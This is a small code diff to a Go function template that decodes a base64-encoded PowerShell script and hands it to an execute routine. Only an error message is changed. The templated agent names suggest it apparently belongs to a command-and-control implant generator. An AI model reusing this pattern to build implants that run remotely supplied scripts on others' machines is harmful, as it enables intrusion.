@@ -2,7 +2,7 @@
 func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_MODULE_FUNC}(encodedScript string) string {
 	decodedScript, err := base64.StdEncoding.DecodeString(encodedScript)
 	if err != nil {
-		return fmt.Sprintf("[ERROR] Failed to decode module: %v", err)
+		return fmt.Sprintf("[ERROR] Failed to decode pwsh script: %v", err)
 	}
 
 	return a.{AGENT_EXECUTE_FUNC}(string(decodedScript))
